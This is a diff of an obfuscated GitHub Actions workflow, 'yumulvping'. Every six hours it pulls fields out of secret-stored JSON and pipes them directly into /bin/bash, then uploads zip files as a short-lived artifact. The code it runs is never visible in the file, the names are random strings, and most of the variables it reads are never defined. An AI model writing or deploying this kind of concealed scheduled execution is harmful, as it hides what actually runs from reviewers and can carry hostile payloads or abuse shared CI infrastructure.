@@ -1,25 +1,27 @@
 name: yumulvping
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '30 3/6 * * *'
 
-jobs:  # 955
+  schedule:
+    - cron: '31 1,7,13,19 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: yumulvping
         env:
-          p5806: ${{ secrets.p5806 }}
+          zth9: ${{ secrets.zth9 }}
         run: |
-          echo $p5806 | jq -r .i03 | /bin/bash
-          echo $yc2 | jq -r .eoo2783 | /bin/bash
-          echo $mp650 | jq -r .uwhn13805 | /bin/bash
-          echo $a9 | jq -r .fxc2 | /bin/bash
-          echo $qqd5205 | jq -r .pld19695 | /bin/bash
-          echo $jpjnp83729 | jq -r .snoc377 | /bin/bash
-          echo $gk809 | jq -r .l59 | /bin/bash
-          echo $rhn77337 | jq -r .br41 | /bin/bash
+          printf '%s' "$zth9" | jq -r .nhgel71873 | /bin/bash
+          echo $xmjk3 | jq -r .mcr18105 | /bin/bash
+          echo $junpx773 | jq -r .emzpc6 | /bin/bash
+          echo $q0 | jq -r .to30130 | /bin/bash
+          echo $bhbu7 | jq -r .idzpy26 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: xFPpV05c
+          path: "*.zip"
+          retention-days: 1
